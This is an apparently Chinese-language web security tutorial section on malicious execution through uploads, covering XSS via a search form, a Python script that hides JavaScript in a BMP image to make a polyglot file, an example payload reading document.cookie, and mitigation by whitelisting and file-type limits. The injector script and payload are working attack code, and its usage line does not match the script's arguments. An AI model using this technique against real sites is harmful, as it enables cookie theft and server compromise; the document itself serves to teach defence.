## 恶意执行
用户上传文件，例如：图片或是视频。 如果没有效的安全措施，包含恶意指令的文件会被上传到服务器并执行。

### 使用场景
上传数据，恶意执行无权访问的操作。

### 漏洞分析
恶意执行很多体现在数据上传上，比如XSS，上传脚本都属于恶意执行。
例如：
```
<form action="search.php">
    <input type="text" name="search" />
    <button name="submit">submit</button>
</form>
```
在一个搜索框里面提交javascript、html等脚本数据，如果没有xss防御就会造成xss等攻击，这就是恶意执行。
如果允许用户上传文件数据，可能会造成执行恶意脚本。例如利用bmp图片文件执行xss。
例如：
在BMP文件末尾做以下修改

（1）\xFF

（2）\x2A\x2F,对应的js中的注释符号*/

（3）\x3D\x31\x3B,对应的=1;  是为了伪造成BMP格式

（4）定制的JS代码

下面这段代码来源网络：
```
#!/usr/bin/env python2.7
import os
import argparse
def injectFile(payload,fname):
        f = open(fname,"r+b")
        b = f.read()
        f.close()

        f = open(fname,"w+b")
        f.write(b)
        f.seek(2,0)
        f.write(b'\x2F\x2A')
        f.close()

        f = open(fname,"a+b")
        f.write(b'\xFF\x2A\x2F\x3D\x31\x3B')
        f.write(payload)
        f.close()
        return True

if __name__ == "__main__":
        parser = argparse.ArgumentParser()
        parser.add_argument("filename",help="the bmp file name to infected")
        parser.add_argument("js_payload",help="the payload to be injected. For exampe: \"alert(1);\"")
        args = parser.parse_args()
        injectFile(args.js_payload,args.filename)
```
运行脚本，将指定的JS代码写入到正常的BMP图片中
格式：python 脚本名 -i 正常BMP格式图片 JSPayload
python BMPinjector.py -i 1.bmp "alert(document.cookie);"

```
<html>
<head><title>Opening an image</title></head>
<body>
<img src="1.bmp"\>
<script src="1.bmp"></script>
</body>
</html>
```
这样上传一个图片，如果文件没做安全检测就会造成里面的代码执行。

如果没有使用白名单或黑名单的方式限制文件类型，可能会造成脚本直接被上传执行。
比如上传一个php、jsp、asp、py等脚本。
就可以直接上传脚本后门控制服务器了。

### 危害
造成XSS攻击或者上传一个脚本后门控制服务器。

### 解决方案
提交的数据使用白名单方式过滤，上传的文件类型做严格的限制。